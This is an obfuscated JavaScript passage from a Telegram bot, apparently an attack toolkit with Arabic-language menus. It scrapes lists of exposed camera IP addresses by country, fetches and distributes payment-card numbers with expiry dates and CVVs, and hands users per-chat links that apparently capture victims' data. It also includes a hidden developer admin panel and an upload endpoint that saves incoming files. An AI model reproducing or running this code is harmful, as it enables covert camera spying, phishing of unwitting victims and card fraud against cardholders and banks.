    const _0x56e02e = _0x317544, _0x238efb = { 'zxRlX': _0x56e02e(0x2b4) };
    await storage[_0x56e02e(0x513)](), vipUsers = await storage[_0x56e02e(0x32e)](_0x238efb[_0x56e02e(0x19a)]) || [];
}
async function saveVipUsers() {
    const _0x710c11 = _0x317544, _0x458546 = { 'cUfyO': _0x710c11(0x2b4) };
    await storage[_0x710c11(0x890)](_0x458546[_0x710c11(0x551)], vipUsers);
}
function showCountryList(_0xd47900, _0x50ea57 = 0x1 * -0x1d69 + -0x1 * -0x22b9 + -0x550) {
    const _0x421e46 = _0x317544, _0x2005ae = {
            'bfGzW': function (_0x7399ee, _0x5f015c) {
                return _0x7399ee + _0x5f015c;
            },
            'bWDer': function (_0x52234e, _0xf5d48d) {
                return _0x52234e < _0xf5d48d;
            },
            'JQEkW': function (_0x532319, _0x45cb84) {
                return _0x532319 < _0x45cb84;
            },
            'rOSZf': function (_0x313cfa, _0x59b5fb) {
                return _0x313cfa > _0x59b5fb;
            },
            'rbrig': _0x421e46(0x4f7),
            'OwAgM': _0x421e46(0x420) + 'ة:'
        };
    try {
        const _0x5559f5 = [], _0x2471b3 = Object[_0x421e46(0x2ff)](countryTranslation), _0xed535f = Object[_0x421e46(0x51e)](countryTranslation), _0x4f908f = Math[_0x421e46(0x40a)](_0x2005ae[_0x421e46(0x65f)](_0x50ea57, -0x1fd0 + 0x2f1 * 0x1 + 0x1d42), _0x2471b3[_0x421e46(0x2c6)]);
        for (let _0x4eec76 = _0x50ea57; _0x2005ae[_0x421e46(0x7e6)](_0x4eec76, _0x4f908f); _0x4eec76 += 0x5c5 * 0x3 + -0xfa8 + -0x1a4) {
            const _0x4dd8d4 = [];
            for (let _0x4aafc9 = _0x4eec76; _0x2005ae[_0x421e46(0x69f)](_0x4aafc9, _0x2005ae[_0x421e46(0x65f)](_0x4eec76, -0x42 * -0x2c + 0x9ef * -0x2 + 0x1b5 * 0x5)) && _0x2005ae[_0x421e46(0x69f)](_0x4aafc9, _0x4f908f); _0x4aafc9++) {
                const _0xca0b3e = _0x2471b3[_0x4aafc9], _0x43e323 = _0xed535f[_0x4aafc9];
                _0x4dd8d4[_0x421e46(0x161)]({
                    'text': _0x43e323,
                    'callback_data': _0xca0b3e
                });
            }
            _0x5559f5[_0x421e46(0x161)](_0x4dd8d4);
        }
        const _0x392afc = [];
        _0x2005ae[_0x421e46(0x7c8)](_0x50ea57, -0x1084 + 0x97 * -0x1 + 0x111b) && _0x392afc[_0x421e46(0x161)], _0x2005ae[_0x421e46(0x7e6)](_0x4f908f, _0x2471b3[_0x421e46(0x2c6)]) && _0x392afc[_0x421e46(0x161)]({
            'text': _0x2005ae[_0x421e46(0x447)],
            'callback_data': _0x421e46(0x811) + _0x4f908f
        }), _0x392afc[_0x421e46(0x2c6)] && _0x5559f5[_0x421e46(0x161)](_0x392afc), bot[_0x421e46(0x5ad) + 'e'](_0xd47900, _0x2005ae[_0x421e46(0x7b9)], { 'reply_markup': { 'inline_keyboard': _0x5559f5 } });
    } catch (_0x6b0ec1) {
        bot[_0x421e46(0x5ad) + 'e'](_0xd47900, _0x421e46(0x771) + _0x421e46(0x727) + _0x421e46(0x3ab) + _0x6b0ec1[_0x421e46(0x4b7)]);
    }
}
async function displayCameras(_0x313582, _0x22a02b) {
    const _0x7693a9 = _0x317544, _0x5cf85c = {
            'LBkdy': _0x7693a9(0x57c) + _0x7693a9(0x475) + _0x7693a9(0x490),
            'rSzJq': function (_0x3a720e, _0x373fa9) {
                return _0x3a720e < _0x373fa9;
            },
            'frivB': function (_0x453180, _0x3a8c4e) {
                return _0x453180 % _0x3a8c4e;
            },
            'qfCiL': _0x7693a9(0x391) + _0x7693a9(0x6c5) + _0x7693a9(0x195) + _0x7693a9(0x73e) + _0x7693a9(0x236) + _0x7693a9(0x8d4) + _0x7693a9(0x390) + _0x7693a9(0x756) + _0x7693a9(0x4ef) + _0x7693a9(0x77e) + _0x7693a9(0x7cd) + '6',
            'jDOtR': _0x7693a9(0x256) + _0x7693a9(0x661) + _0x7693a9(0x1c9) + _0x7693a9(0x1be) + _0x7693a9(0x3d1) + _0x7693a9(0x707) + _0x7693a9(0x4c2) + _0x7693a9(0x6e3) + _0x7693a9(0x6ab) + _0x7693a9(0x56c),
            'MKkWS': function (_0x2960ec, _0x1bddc8, _0x200cc3) {
                return _0x2960ec(_0x1bddc8, _0x200cc3);
            },
            'AlMMs': function (_0xe4a742, _0x47c49f) {
                return _0xe4a742 <= _0x47c49f;
            },
            'UIWMg': function (_0x535a92, _0x48ae82) {
                return _0x535a92 + _0x48ae82;
            },
            'QHaqO': _0x7693a9(0x1ff) + _0x7693a9(0x661) + _0x7693a9(0x1c9) + _0x7693a9(0x868) + _0x7693a9(0x91a) + _0x7693a9(0x42c) + _0x7693a9(0x3f1) + _0x7693a9(0x2ed) + _0x7693a9(0x7f0) + _0x7693a9(0x561) + _0x7693a9(0x40d) + _0x7693a9(0x312) + _0x7693a9(0x223) + _0x7693a9(0x4d2) + _0x7693a9(0x309) + _0x7693a9(0x6e6) + _0x7693a9(0x708) + _0x7693a9(0x4e4) + _0x7693a9(0x567),
            'bhBez': _0x7693a9(0x256) + _0x7693a9(0x661) + _0x7693a9(0x1c9) + _0x7693a9(0x1be) + _0x7693a9(0x3d1) + _0x7693a9(0x4b2) + _0x7693a9(0x534) + _0x7693a9(0x6b1) + _0x7693a9(0x455) + _0x7693a9(0x1f5)
        };
    try {
        const _0x4a5199 = await bot[_0x7693a9(0x5ad) + 'e'](_0x313582, _0x5cf85c[_0x7693a9(0x739)]), _0x263d9f = _0x4a5199[_0x7693a9(0x204)];
        for (let _0x255467 = -0x10c4 + -0x1c2e + 0x2cf2; _0x5cf85c[_0x7693a9(0x678)](_0x255467, -0x18 * 0x152 + 0x1fff * -0x1 + 0xc7 * 0x52); _0x255467++) {
            await bot[_0x7693a9(0x8b1) + _0x7693a9(0x798)](_0x7693a9(0x57c) + _0x7693a9(0x475) + _0x7693a9(0x533) + '.'[_0x7693a9(0x822)](_0x5cf85c[_0x7693a9(0x6f6)](_0x255467, 0x1c4a + 0x1ce6 + 0x392c * -0x1)), {
                'chat_id': _0x313582,
                'message_id': _0x263d9f
            }), await new Promise(_0x5393af => setTimeout(_0x5393af, 0x1 * 0x17f5 + 0xbfd + -0x200a));
        }
        const _0x30b403 = _0x7693a9(0x3c8) + _0x7693a9(0x574) + _0x7693a9(0x27e) + _0x7693a9(0x1a7) + _0x22a02b, _0x143a91 = { 'User-Agent': _0x5cf85c[_0x7693a9(0x1a5)] };
        let _0x55309a = await axios[_0x7693a9(0x3c5)](_0x30b403, { 'headers': _0x143a91 });
        const _0x8d3de1 = _0x55309a[_0x7693a9(0x369)][_0x7693a9(0x2bf)](/pagenavigator\("\?page=", (\d+)/);
        if (!_0x8d3de1) {
            bot[_0x7693a9(0x5ad) + 'e'](_0x313582, _0x5cf85c[_0x7693a9(0x38a)]);
            return;
        }
        const _0x3ff56f = _0x5cf85c[_0x7693a9(0x572)](parseInt, _0x8d3de1[0x1639 + 0x2d * -0xb7 + -0x1 * -0x9f3], -0x6de + -0x1 * -0xf2b + -0x843), _0x1a2617 = [];
        for (let _0x19b128 = 0x525 + 0x4e7 + -0xa0b; _0x5cf85c[_0x7693a9(0x46d)](_0x19b128, _0x3ff56f); _0x19b128++) {
            _0x55309a = await axios[_0x7693a9(0x3c5)](_0x30b403 + _0x7693a9(0x51b) + _0x19b128, { 'headers': _0x143a91 });
            const _0x585419 = _0x55309a[_0x7693a9(0x369)][_0x7693a9(0x2bf)](/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
            _0x1a2617[_0x7693a9(0x161)](..._0x585419);
        }
        if (_0x1a2617[_0x7693a9(0x2c6)]) {
            const _0x37bd79 = _0x1a2617[_0x7693a9(0x1de)]((_0xe5cfe1, _0x38b3f8) => _0x38b3f8 + (0x132f + 0x4d * -0x1 + -0xb3 * 0x1b) + '.\x20' + _0xe5cfe1);
            for (let _0xe36010 = 0x108e + -0x1 * 0x1c87 + 0xbf9 * 0x1; _0x5cf85c[_0x7693a9(0x678)](_0xe36010, _0x37bd79[_0x7693a9(0x2c6)]); _0xe36010 += -0x74 * 0x55 + 0x2 * -0xec + -0x2 * -0x1447) {
                const _0x3ae993 = _0x37bd79[_0x7693a9(0x2ec)](_0xe36010, _0x5cf85c[_0x7693a9(0x615)](_0xe36010, -0x19b7 + 0x41a + -0x15cf * -0x1));
                await bot[_0x7693a9(0x5ad) + 'e'](_0x313582, _0x3ae993[_0x7693a9(0x57f)]('\x0a'));
            }
            await bot[_0x7693a9(0x5ad) + 'e'](_0x313582, _0x5cf85c[_0x7693a9(0x436)]);
        } else
            await bot[_0x7693a9(0x5ad) + 'e'](_0x313582, _0x5cf85c[_0x7693a9(0x6bf)]);
    } catch (_0x119c89) {
        await bot[_0x7693a9(0x5ad) + 'e'](_0x313582, _0x7693a9(0x256) + _0x7693a9(0x661) + _0x7693a9(0x1c9) + _0x7693a9(0x1be) + _0x7693a9(0x3d1) + _0x7693a9(0x4b2) + _0x7693a9(0x534) + _0x7693a9(0x6b1) + _0x7693a9(0x455) + _0x7693a9(0x1f5));
    }
}
function isDeveloper(_0x1d0292) {
    const _0x23e0e0 = _0x317544, _0x42dc87 = {
            'sIRRb': function (_0x3cf94f, _0x4c650e) {
                return _0x3cf94f === _0x4c650e;
            }
        }, _0x6d990e = 0xb3 * 0x15de149 + -0x15d3d4c15 + 0x46c2874 * 0x65;
    return _0x42dc87[_0x23e0e0(0x5d0)](_0x1d0292, _0x6d990e);
}
function showAdminPanel(_0x332078) {
    const _0x57141f = _0x317544, _0x3caec9 = {
            'rSMGR': _0x57141f(0x494) + 'م:',
            'utKzG': _0x57141f(0x23f) + _0x57141f(0x564),
            'awDhP': _0x57141f(0x884),
            'spxuA': _0x57141f(0x590) + _0x57141f(0x564),
            'elLpd': _0x57141f(0x6d8)
        };
    bot[_0x57141f(0x5ad) + 'e'](_0x332078, _0x3caec9[_0x57141f(0x6a6)], {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x3caec9[_0x57141f(0x7be)],
                        'callback_data': _0x3caec9[_0x57141f(0x543)]
                    }],
                [{
                        'text': _0x3caec9[_0x57141f(0x1af)],
                        'callback_data': _0x3caec9[_0x57141f(0x8f8)]
                    }]
            ]
        }
    });
}
bot[_0x317544(0x62c)](/\/jjjjjavayy/, _0x26afe2 => {
    const _0x69506a = _0x317544, _0x4e817d = {
            'fcgil': _0x69506a(0x3e9) + _0x69506a(0x30e) + _0x69506a(0x3dc) + _0x69506a(0x198) + _0x69506a(0x45d),
            'iXUbZ': _0x69506a(0x3c1) + 'ي',
            'TmBHR': _0x69506a(0x82d),
            'TTYdh': _0x69506a(0x50d) + _0x69506a(0x85f),
            'hrzIN': _0x69506a(0x305) + 're',
            'xYCMf': _0x69506a(0x694) + 'ء',
            'elwAR': _0x69506a(0x1d9)
        }, _0x418b01 = _0x26afe2[_0x69506a(0x61f)]['id'], _0x12a3ad = _0x4e817d[_0x69506a(0x6ea)];
    bot[_0x69506a(0x5ad) + 'e'](_0x418b01, _0x12a3ad, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x4e817d[_0x69506a(0x1b3)],
                        'callback_data': _0x4e817d[_0x69506a(0x1b5)]
                    }],
                [{
                        'text': _0x4e817d[_0x69506a(0x7b8)],
                        'callback_data': _0x4e817d[_0x69506a(0x85a)]
                    }],
                [{
                        'text': _0x4e817d[_0x69506a(0x327)],
                        'callback_data': _0x4e817d[_0x69506a(0x19d)]
                    }]
            ]
        }
    });
}), bot['on'](_0x317544(0x635) + _0x317544(0x53f), _0x5627a8 => {
    const _0x7a9c6 = _0x317544, _0x13b3c3 = {
            'aVNmU': function (_0x5a1833, _0x13deb1) {
                return _0x5a1833 === _0x13deb1;
            },
            'blmTh': _0x7a9c6(0x82d),
            'eQnYo': _0x7a9c6(0x305) + 're',
            'uaPRB': function (_0x3d9893, _0x48af16) {
                return _0x3d9893 === _0x48af16;
            },
            'hoZkw': _0x7a9c6(0x1d9),
            'SSdOD': _0x7a9c6(0x367) + _0x7a9c6(0x755) + '\x20✅',
            'UfzOJ': function (_0x3c8245, _0x241d09) {
                return _0x3c8245 === _0x241d09;
            },
            'gesVx': _0x7a9c6(0x2e7)
        }, _0xf02101 = _0x5627a8[_0x7a9c6(0x4b7)][_0x7a9c6(0x61f)]['id'];
    let _0x480fc6;
    if (_0x13b3c3[_0x7a9c6(0x696)](_0x5627a8[_0x7a9c6(0x369)], _0x13b3c3[_0x7a9c6(0x2b1)]))
        _0x480fc6 = baseUrl + (_0x7a9c6(0x4f4) + _0x7a9c6(0x888)) + _0xf02101 + _0x7a9c6(0x540);
    else {
        if (_0x13b3c3[_0x7a9c6(0x696)](_0x5627a8[_0x7a9c6(0x369)], _0x13b3c3[_0x7a9c6(0x1ce)]))
            _0x480fc6 = baseUrl + (_0x7a9c6(0x717) + _0x7a9c6(0x888)) + _0xf02101 + _0x7a9c6(0x540);
        else
            _0x13b3c3[_0x7a9c6(0x86e)](_0x5627a8[_0x7a9c6(0x369)], _0x13b3c3[_0x7a9c6(0x80c)]) && (_0x480fc6 = baseUrl + (_0x7a9c6(0x29f) + _0x7a9c6(0x888)) + _0xf02101 + _0x7a9c6(0x540));
    }
    if (_0x480fc6)
        bot[_0x7a9c6(0x5ad) + 'e'](_0xf02101, _0x7a9c6(0x8dc) + _0x7a9c6(0x26e) + _0x480fc6), bot[_0x7a9c6(0x779) + _0x7a9c6(0x315)](_0x5627a8['id'], { 'text': _0x13b3c3[_0x7a9c6(0x348)] });
    else
        _0x13b3c3[_0x7a9c6(0x491)](_0x5627a8[_0x7a9c6(0x369)], _0x13b3c3[_0x7a9c6(0x90c)]) && (bot[_0x7a9c6(0x5ad) + 'e'](_0xf02101, _0x7a9c6(0x261) + _0x7a9c6(0x16e) + _0x7a9c6(0x8f6) + _0x7a9c6(0x785) + _0x7a9c6(0x879) + _0x7a9c6(0x3db) + _0x7a9c6(0x4d0) + 'ip'), bot[_0x7a9c6(0x779) + _0x7a9c6(0x315)](_0x5627a8['id'], { 'text': '' }));
}), bot[_0x317544(0x62c)](/\/نننطسطوو/, _0x376626 => {
    const _0x547537 = _0x317544, _0x44528e = {
            'aQKkV': _0x547537(0x190) + _0x547537(0x692) + _0x547537(0x332) + _0x547537(0x183),
            'xwIaW': _0x547537(0x3cf) + _0x547537(0x3f9),
            'RqzSZ': _0x547537(0x7b7) + 's',
            'HhogA': function (_0x418e9f, _0x21e19e) {
                return _0x418e9f(_0x21e19e);
            },
            'mbRdj': function (_0x506445, _0x26a0cd) {
                return _0x506445(_0x26a0cd);
            }
        }, _0x15c481 = _0x376626[_0x547537(0x61f)]['id'];
    bot[_0x547537(0x5ad) + 'e'](_0x15c481, _0x44528e[_0x547537(0x25e)], {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x44528e[_0x547537(0x85d)],
                        'callback_data': _0x44528e[_0x547537(0x27b)]
                    }]]
        }
    }), _0x44528e[_0x547537(0x853)](isDeveloper, _0x15c481) && _0x44528e[_0x547537(0x6d2)](showAdminPanel, _0x15c481);
}), bot['on'](_0x317544(0x635) + _0x317544(0x53f), async _0x45da16 => {
    const _0x52a78a = _0x317544, _0x37b0ea = {
            'uTDtS': function (_0x4cc814, _0x4f595a) {
                return _0x4cc814 === _0x4f595a;
            },
            'dQXqm': _0x52a78a(0x7b7) + 's',
            'BdFPp': function (_0x313f0b, _0x4e6cf3) {
                return _0x313f0b(_0x4e6cf3);
            },
            'pObPH': function (_0x4c7d5e, _0x64ec69) {
                return _0x4c7d5e in _0x64ec69;
            },
            'aQMhZ': function (_0x585f32, _0x1a90aa, _0x58345d) {
                return _0x585f32(_0x1a90aa, _0x58345d);
            },
            'tqxXZ': _0x52a78a(0x811),
            'IORce': function (_0x20a15f, _0x34999d, _0x131f69) {
                return _0x20a15f(_0x34999d, _0x131f69);
            },
            'RRoqc': _0x52a78a(0x488),
            'OlMDi': function (_0x2fb426, _0xd6acba, _0xd76ea3) {
                return _0x2fb426(_0xd6acba, _0xd76ea3);
            },
            'wFHkk': function (_0x563704, _0x423026) {
                return _0x563704 - _0x423026;
            },
            'qyAqy': function (_0x2f1650, _0x10da7f, _0x41fa8e) {
                return _0x2f1650(_0x10da7f, _0x41fa8e);
            }
        }, _0x2a303c = _0x45da16[_0x52a78a(0x4b7)][_0x52a78a(0x61f)]['id'];
    if (_0x37b0ea[_0x52a78a(0x667)](_0x45da16[_0x52a78a(0x369)], _0x37b0ea[_0x52a78a(0x4c7)]))
        _0x37b0ea[_0x52a78a(0x1e1)](showCountryList, _0x2a303c);
    else {
        if (_0x37b0ea[_0x52a78a(0x39f)](_0x45da16[_0x52a78a(0x369)], countryTranslation))
            bot[_0x52a78a(0x7e2) + _0x52a78a(0x22e)](_0x2a303c, _0x45da16[_0x52a78a(0x4b7)][_0x52a78a(0x204)]), _0x37b0ea[_0x52a78a(0x4e9)](displayCameras, _0x2a303c, _0x45da16[_0x52a78a(0x369)]);
        else {
            if (_0x45da16[_0x52a78a(0x369)][_0x52a78a(0x83d)](_0x37b0ea[_0x52a78a(0x2fa)])) {
                const _0x263d98 = _0x37b0ea[_0x52a78a(0x4e9)](parseInt, _0x45da16[_0x52a78a(0x369)][_0x52a78a(0x594)]('_')[-0x223a + 0xfac + 0x128f], -0x43b * 0x3 + -0x1 * 0x267d + 0xcce * 0x4);
                bot[_0x52a78a(0x7e2) + _0x52a78a(0x22e)](_0x2a303c, _0x45da16[_0x52a78a(0x4b7)][_0x52a78a(0x204)]), _0x37b0ea[_0x52a78a(0x31f)](showCountryList, _0x2a303c, _0x263d98);
            } else {
                if (_0x45da16[_0x52a78a(0x369)][_0x52a78a(0x83d)](_0x37b0ea[_0x52a78a(0x21d)])) {
                    const _0x3ac36b = _0x37b0ea[_0x52a78a(0x669)](parseInt, _0x45da16[_0x52a78a(0x369)][_0x52a78a(0x594)]('_')[-0x1cfc + -0x3 * 0x6d1 + 0x3170 * 0x1], 0x71 * -0x1 + 0x182e + -0x17b3), _0x5900ea = Math[_0x52a78a(0x1d8)](0x1cf0 + -0x8f * -0x32 + -0x38de, _0x37b0ea[_0x52a78a(0x8fd)](_0x3ac36b, 0x1cf3 + 0x42 * 0x3e + -0x2cdd));
                    bot[_0x52a78a(0x7e2) + _0x52a78a(0x22e)](_0x2a303c, _0x45da16[_0x52a78a(0x4b7)][_0x52a78a(0x204)]), _0x37b0ea[_0x52a78a(0x63e)](showCountryList, _0x2a303c, _0x5900ea);
                }
            }
        }
    }
});
const americanBanks = [
        _0x317544(0x4b1) + _0x317544(0x5b7),
        _0x317544(0x870),
        _0x317544(0x4ee),
        _0x317544(0x22c) + 'o',
        _0x317544(0x68e) + 'e',
        _0x317544(0x550),
        _0x317544(0x173),
        _0x317544(0x8da),
        _0x317544(0x6c1) + _0x317544(0x405),
        _0x317544(0x7eb) + _0x317544(0x2d4)
    ], fetchVisaData = async () => {
        const _0x20828d = _0x317544, _0x3253e2 = {
                'FfsJz': function (_0x350c30, _0x2a31b8) {
                    return _0x350c30 === _0x2a31b8;
                },
                'kivhP': function (_0x51c5e5, _0x2d0c0c) {
                    return _0x51c5e5 * _0x2d0c0c;
                },
                'OZfWH': _0x20828d(0x29c) + _0x20828d(0x39b) + _0x20828d(0x80a),
                'YDCMZ': _0x20828d(0x651),
                'NoZlL': function (_0x13fed2, _0x1eeec4) {
                    return _0x13fed2 + _0x1eeec4;
                },
                'sLffS': _0x20828d(0x5f3) + _0x20828d(0x36a) + _0x20828d(0x733),
                'cTnnl': function (_0x471c76, _0x234840) {
                    return _0x471c76 > _0x234840;
                },
                'NoaGJ': _0x20828d(0x1aa) + _0x20828d(0x6b7) + _0x20828d(0x6f2) + _0x20828d(0x6a0) + _0x20828d(0x8a8) + _0x20828d(0x71b),
                'QUVli': _0x20828d(0x450) + _0x20828d(0x422)
            };
        try {
            const _0x314f3f = _0x3253e2[_0x20828d(0x1ba)], _0xe30888 = await axios[_0x20828d(0x3c5)](_0x314f3f), _0x12f00c = _0xe30888[_0x20828d(0x369)], _0x35c0ee = _0x12f00c[_0x20828d(0x5c2)]()[_0x20828d(0x594)]('\x0a');
            if (_0x3253e2[_0x20828d(0x6fc)](_0x35c0ee[_0x20828d(0x2c6)], -0x1a2c + 0xa * 0x3b9 + -0xb0e)) {
                const _0x51eb05 = _0x35c0ee[_0x20828d(0x1de)](_0x36f5b3 => {
                    const _0x7e0b14 = _0x20828d, _0x3af808 = _0x36f5b3[_0x7e0b14(0x594)]('|');
                    if (_0x3253e2[_0x7e0b14(0x459)](_0x3af808[_0x7e0b14(0x2c6)], -0x2c2 * -0x8 + 0x84e + -0x1e5a))
                        return {
                            'CardNumber': _0x3af808[-0x110a + -0x1663 + -0x1 * -0x276d],
                            'Expiry': _0x3af808[0x1878 + -0x582 + -0x12f5] + '/' + _0x3af808[-0x201 + 0x6df * 0x4 + -0x1 * 0x1979],
                            'CVV': _0x3af808[0x3 * 0x191 + 0x4 * -0x9ac + -0x200 * -0x11],
                            'Bank': americanBanks[Math[_0x7e0b14(0x5a3)](_0x3253e2[_0x7e0b14(0x4ba)](Math[_0x7e0b14(0x3a8)](), americanBanks[_0x7e0b14(0x2c6)]))],
                            'CardType': _0x3253e2[_0x7e0b14(0x78f)],
                            'Country': _0x3253e2[_0x7e0b14(0x914)],
                            'Value': '$' + _0x3253e2[_0x7e0b14(0x921)](Math[_0x7e0b14(0x5a3)](_0x3253e2[_0x7e0b14(0x4ba)](Math[_0x7e0b14(0x3a8)](), -0x18a0 + -0xf95 * -0x1 + 0x11 * 0x8a)), 0x71f * -0x5 + 0xd8d * 0x1 + 0x7 * 0x328)
                        };
                })[_0x20828d(0x81b)](Boolean);
                if (_0x3253e2[_0x20828d(0x6fc)](_0x51eb05[_0x20828d(0x2c6)], 0x1 * 0xc1a + -0xcbd * -0x1 + -0x18d7))
                    return _0x51eb05[Math[_0x20828d(0x5a3)](_0x3253e2[_0x20828d(0x4ba)](Math[_0x20828d(0x3a8)](), _0x51eb05[_0x20828d(0x2c6)]))];
            }
            return console[_0x20828d(0x699)](_0x3253e2[_0x20828d(0x2c2)]), null;
        } catch (_0x3856c8) {
            return console[_0x20828d(0x699)](_0x3253e2[_0x20828d(0x752)], _0x3856c8[_0x20828d(0x4b7)]), null;
        }
    };
bot[_0x317544(0x62c)](/\/نكخمنتته/, _0x5c1ea6 => {
    const _0x80cb2c = _0x317544, _0x466f49 = {
            'ZCJxp': _0x80cb2c(0x2f0) + _0x80cb2c(0x7dc),
            'oQsMe': _0x80cb2c(0x1ac) + _0x80cb2c(0x7dc),
            'dwSMs': _0x80cb2c(0x910),
            'VGwQT': _0x80cb2c(0x24c) + _0x80cb2c(0x74f) + _0x80cb2c(0x5e6) + _0x80cb2c(0x78a) + _0x80cb2c(0x84e) + _0x80cb2c(0x458) + _0x80cb2c(0x736)
        }, _0x499752 = _0x5c1ea6[_0x80cb2c(0x61f)]['id'], _0x26ab09 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x466f49[_0x80cb2c(0x234)],
                            'callback_data': _0x466f49[_0x80cb2c(0x3e7)]
                        }]]
            },
            'parse_mode': _0x466f49[_0x80cb2c(0x274)]
        };
    bot[_0x80cb2c(0x5ad) + 'e'](_0x499752, _0x466f49[_0x80cb2c(0x562)], _0x26ab09);
}), bot['on'](_0x317544(0x635) + _0x317544(0x53f), async _0x3e0e33 => {
    const _0x27fc24 = _0x317544, _0xd182b = {
            'yfjVX': function (_0x3ca79f, _0x397bf6) {
                return _0x3ca79f === _0x397bf6;
            },
            'QEaNQ': _0x27fc24(0x1ac) + _0x27fc24(0x7dc),
            'FtszS': _0x27fc24(0x62a) + _0x27fc24(0x221) + _0x27fc24(0x720) + _0x27fc24(0x8db),
            'rhJPQ': _0x27fc24(0x62a) + _0x27fc24(0x221) + _0x27fc24(0x91c) + _0x27fc24(0x415),
            'qqkOs': _0x27fc24(0x62a) + _0x27fc24(0x221) + _0x27fc24(0x792) + _0x27fc24(0x2d9),
            'BNBGu': _0x27fc24(0x62a) + _0x27fc24(0x221) + _0x27fc24(0x241) + _0x27fc24(0x2ad),
            'GUtuO': _0x27fc24(0x62a) + _0x27fc24(0x221) + _0x27fc24(0x197) + _0x27fc24(0x4e3),
            'gQehc': function (_0x345882) {
                return _0x345882();
            },
            'dttao': _0x27fc24(0x910),
            'oQgIV': _0x27fc24(0x81d) + _0x27fc24(0x33f) + _0x27fc24(0x364) + _0x27fc24(0x1fb) + _0x27fc24(0x514)
        }, _0x265d0e = _0x3e0e33[_0x27fc24(0x4b7)][_0x27fc24(0x61f)]['id'];
    if (_0xd182b[_0x27fc24(0x86c)](_0x3e0e33[_0x27fc24(0x369)], _0xd182b[_0x27fc24(0x83f)])) {
        let _0x35c807 = await bot[_0x27fc24(0x5ad) + 'e'](_0x265d0e, _0xd182b[_0x27fc24(0x872)]);
        await new Promise(_0x5ee209 => setTimeout(_0x5ee209, -0x19b + -0x17f6 + 0x1d79)), await bot[_0x27fc24(0x8b1) + _0x27fc24(0x798)](_0xd182b[_0x27fc24(0x90d)], {
            'chat_id': _0x265d0e,
            'message_id': _0x35c807[_0x27fc24(0x204)]
        }), await new Promise(_0x21deae => setTimeout(_0x21deae, -0xd * 0x1d3 + -0xb6b * -0x3 + -0x6a2)), await bot[_0x27fc24(0x8b1) + _0x27fc24(0x798)](_0xd182b[_0x27fc24(0x6b5)], {
            'chat_id': _0x265d0e,
            'message_id': _0x35c807[_0x27fc24(0x204)]
        }), await new Promise(_0x22abad => setTimeout(_0x22abad, 0x1484 + -0x1738 + -0x5e * -0x12)), await bot[_0x27fc24(0x8b1) + _0x27fc24(0x798)](_0xd182b[_0x27fc24(0x466)], {
            'chat_id': _0x265d0e,
            'message_id': _0x35c807[_0x27fc24(0x204)]
        }), await new Promise(_0x530ac3 => setTimeout(_0x530ac3, -0x17 * -0xd6 + 0x9ce + 0x324 * -0x8)), await bot[_0x27fc24(0x8b1) + _0x27fc24(0x798)](_0xd182b[_0x27fc24(0x5cf)], {
            'chat_id': _0x265d0e,
            'message_id': _0x35c807[_0x27fc24(0x204)]
        }), await new Promise(_0x173346 => setTimeout(_0x173346, -0x11 * -0x121 + -0x105f + 0x116 * 0x1)), await bot[_0x27fc24(0x7e2) + _0x27fc24(0x22e)](_0x265d0e, _0x35c807[_0x27fc24(0x204)]);
        const _0x3a2598 = await _0xd182b[_0x27fc24(0x7fe)](fetchVisaData);
        if (_0x3a2598) {
            const {
                CardNumber: _0x6a2e00,
                Expiry: _0xfb74d,
                CVV: _0x4ebc00,
                Bank: _0x5ee2b7,
                CardType: _0x51d3ff,
                Country: _0x11bb68,
                Value: _0x46b8b0
            } = _0x3a2598;
            bot[_0x27fc24(0x5ad) + 'e'](_0x265d0e, _0x27fc24(0x7c9) + _0x27fc24(0x265) + _0x27fc24(0x20d) + '`' + _0x6a2e00 + (_0x27fc24(0x359) + _0x27fc24(0x6e1)) + _0xfb74d + (_0x27fc24(0x7d1) + _0x27fc24(0x1ef)) + _0x4ebc00 + (_0x27fc24(0x7a9) + _0x27fc24(0x891)) + _0x5ee2b7 + (_0x27fc24(0x5bf) + _0x27fc24(0x307) + '`') + _0x51d3ff + (_0x27fc24(0x28c) + _0x27fc24(0x4cb)) + _0x11bb68 + (_0x27fc24(0x747) + _0x27fc24(0x923)) + _0x46b8b0 + (_0x27fc24(0x3b6) + _0x27fc24(0x65a) + _0x27fc24(0x65a) + _0x27fc24(0x3ef) + _0x27fc24(0x5d9) + _0x27fc24(0x6f7) + _0x27fc24(0x6d1)), { 'parse_mode': _0xd182b[_0x27fc24(0x342)] });
        } else
            bot[_0x27fc24(0x5ad) + 'e'](_0x265d0e, _0xd182b[_0x27fc24(0x463)]);
    }
});
const deleteFolderRecursive = _0x7eb864 => {
    const _0x4271d2 = _0x317544, _0x220723 = {
            'CUltH': function (_0x2ae864, _0x24d6aa) {
                return _0x2ae864(_0x24d6aa);
            }
        };
    fs[_0x4271d2(0x899)](_0x7eb864) && (fs[_0x4271d2(0x3af) + 'c'](_0x7eb864)[_0x4271d2(0x3b5)](_0x45cc11 => {
        const _0x57a79f = _0x4271d2, _0x231c64 = path[_0x57a79f(0x57f)](_0x7eb864, _0x45cc11);
        fs[_0x57a79f(0x3e5)](_0x231c64)[_0x57a79f(0x7c0) + 'y']() ? _0x220723[_0x57a79f(0x53a)](deleteFolderRecursive, _0x231c64) : fs[_0x57a79f(0x72c)](_0x231c64);
    }), fs[_0x4271d2(0x387)](_0x7eb864));
};
app[_0x317544(0x47c)](express[_0x317544(0x496)](__dirname)), app[_0x317544(0x33a)](_0x317544(0x4c3), (_0x1a8752, _0x2c9391) => {
    const _0x27c446 = _0x317544, _0x356c20 = {
            'kXnxM': _0x27c446(0x8ff),
            'AojHR': function (_0x1f5eea, _0x1d6819) {
                return _0x1f5eea + _0x1d6819;
            },
            'ofLNd': _0x27c446(0x73a),
            'rMOAn': _0x27c446(0x90f)
        }, _0x55977b = _0x1a8752[_0x27c446(0x51f)][_0x27c446(0x767)], _0x12a2ae = _0x1a8752[_0x27c446(0x51f)][_0x27c446(0x8ea)][_0x27c446(0x594)](','), _0x40ed0 = path[_0x27c446(0x57f)](__dirname, _0x356c20[_0x27c446(0x7cc)]);
    !fs[_0x27c446(0x899)](_0x40ed0) && fs[_0x27c446(0x6cb)](_0x40ed0), _0x12a2ae[_0x27c446(0x3b5)]((_0x5e467d, _0x9d5394) => {
